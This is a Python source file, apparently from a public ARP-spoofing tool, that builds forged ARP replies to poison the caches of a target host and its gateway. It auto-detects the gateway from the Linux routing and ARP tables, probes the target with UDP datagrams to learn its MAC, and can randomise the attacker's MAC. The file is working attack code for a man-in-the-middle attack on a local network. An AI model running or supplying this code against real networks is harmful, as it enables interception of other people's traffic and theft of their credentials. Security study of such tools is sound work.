#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

from csv import DictReader
from random import choices, randint
from socket import inet_ntoa, socket, AF_INET, AF_PACKET, SOCK_DGRAM, SOCK_RAW
from struct import pack
from time import sleep

from protocols import ARP, Ethernet, Packet


class ARPAttackPackets(object):
    def __init__(self, attacker_mac: str, gateway_mac: str, gateway_ip: str,
                 target_mac: str, target_ip: str):
        self.attacker_mac = attacker_mac
        self.gateway_mac = gateway_mac
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.target_ip = target_ip
        self.payloads = self.payload_to_gateway, self.payload_to_target

    def __iter__(self):
        yield from self.payloads

    @property
    def payload_to_gateway(self):
        gateway = Packet(Ethernet(dst=self.gateway_mac, src=self.attacker_mac,
                                  eth=0x0806),
                         ARP(sha=self.attacker_mac, spa=self.target_ip,
                             tha=self.gateway_mac, tpa=self.gateway_ip))
        return gateway.payload

    @property
    def payload_to_target(self):
        target = Packet(Ethernet(dst=self.target_mac, src=self.attacker_mac,
                                 eth=0x0806),
                        ARP(sha=self.attacker_mac, spa=self.gateway_ip,
                            tha=self.target_mac, tpa=self.target_ip))
        return target.payload


class ARPSetupProxy(object):
    """
    Proxy class for ARPAttackPackets.

    Performs a best-effort attempt to query the system and network for
    information necessary to build the ARP attack packets. It allows the
    user to initiate an attack by simply supplying the target's IP
    address. All other required settings are looked up from the
    attacker system's ARP and routing tables and by probing ephemeral
    ports on the target host.
    """

    def __init__(self, interface, attacker_mac, gateway_mac,
                 gateway_ip, target_mac, target_ip, disassociate):
        self.__get_gateway_route()
        self.interface = interface
        self._disassociate = disassociate
        self._target_ip = target_ip
        self._gateway_ip = gateway_ip
        self._target_mac = target_mac
        self._gateway_mac = gateway_mac
        self._attacker_mac = attacker_mac
        self.packets = ARPAttackPackets(self._attacker_mac,
                                        self._gateway_mac,
                                        self._gateway_ip,
                                        self._target_mac,
                                        self._target_ip)

    @staticmethod
    def arp_table():
        with open('/proc/net/arp', 'r', encoding='utf_8') as arp_table:
            field_names = ['ip_address', 'hw_type', 'flags',
                           'hw_address', 'mask', 'device']
            reader = DictReader(arp_table, fieldnames=field_names,
                                skipinitialspace=True, delimiter=' ')
            next(reader)  # Skip header line
            return tuple(line for line in reader)

    @property
    def routing_table(self):
        with open('/proc/net/route', 'r', encoding='utf_8') as routing_table:
            field_names = ['interface', 'destination', 'gateway', 'flags',
                           'ref_cnt', 'use', 'metric', 'mask', 'mtu',
                           'window', 'irtt']
            reader = DictReader(routing_table, fieldnames=field_names,
                                skipinitialspace=True, delimiter='\t')
            next(reader)  # Skip header line
            yield from (line for line in reader)

    def __get_gateway_route(self):
        for route in self.routing_table:
            if int(route['flags'], base=16) == 3:
                """Flag 0x0003 in the routing table indicates a usable 
                route whose destination is a gateway. Defined by Linux 
                Kernel userspace API at route.h"""
                self.gateway_route = route

    @property
    def interface(self):
        return self.__interface

    @interface.setter
    def interface(self, interface_name):
        if interface_name is None:
            interface_name = self.gateway_route['interface']
        self.__interface = interface_name

    @property
    def _gateway_ip(self):
        return self.__gateway_ip

    @_gateway_ip.setter
    def _gateway_ip(self, ip_addr):
        if ip_addr is None:
            ip_addr = inet_ntoa(
                pack("=L", int(self.gateway_route['gateway'], 16)))
        self.__gateway_ip = ip_addr

    @property
    def _gateway_mac(self):
        return self.__gateway_mac

    @_gateway_mac.setter
    def _gateway_mac(self, mac_addr):
        if mac_addr is None:
            for entry in self.arp_table():
                if entry['ip_address'] == self._gateway_ip:
                    mac_addr = entry['hw_address']
        self.__gateway_mac = mac_addr

    @property
    def _target_mac(self):
        """
        Gets the target's MAC address.
        Sets the target's MAC address by sending it UDP datagrams with
        null-bytes to random ports contained in the ephemeral port range
        (IETF RFC 6335) and then looking up its registered MAC address
        in the attacker's ARP table.
        """
        return self.__target_mac
    
    @_target_mac.setter
    def _target_mac(self, mac_addr: str):
        with socket(AF_INET, SOCK_DGRAM) as sock:
            while mac_addr is None:
                port = randint(49152, 65535)
                sock.sendto(b'', (self._target_ip, port))
                sleep(2)
                for entry in self.arp_table():
                    if entry['ip_address'] == self._target_ip:
                        mac_addr = entry['hw_address']
        self.__target_mac = mac_addr

    @property
    def _attacker_mac(self):
        """
        Gets the attacker's MAC address.
        Sets the attacker's MAC address to a random IEEE 802 compliant
        address if 'disassociate' is set to True or queries the system
        for the interface's address by temporarily binding to it.
        """
        return self.__attacker_mac

    @_attacker_mac.setter
    def _attacker_mac(self, mac_addr):
        if mac_addr is None:
            if self._disassociate is True:
                mac_addr = self.__randomize_mac_addr()
            else:
                with socket(AF_PACKET, SOCK_RAW) as sock:
                    sock.bind((self.interface, 0))
                    mac_address: bytes = sock.getsockname()[4]
                mac_addr = self.__bytes_to_mac_addr(mac_address)
        self.__attacker_mac = mac_addr

    @staticmethod
    def __randomize_mac_addr() -> str:
        hex_values = '0123456789ABCDEF'
        return ':'.join(''.join(choices(hex_values, k=2)) for _ in range(6))

    @staticmethod
    def __bytes_to_mac_addr(addr: bytes) -> str:
        """
        Converts a network-formatted byte-string of length 6 bytes to
        IEEE 802 MAC address.
        Ex: From b'\xceP\x9a\xcc\x8c\x9d' to 'ce:50:9a:cc:8c:9d'
        """
        return ':'.join('{:02x}'.format(octet) for octet in addr)
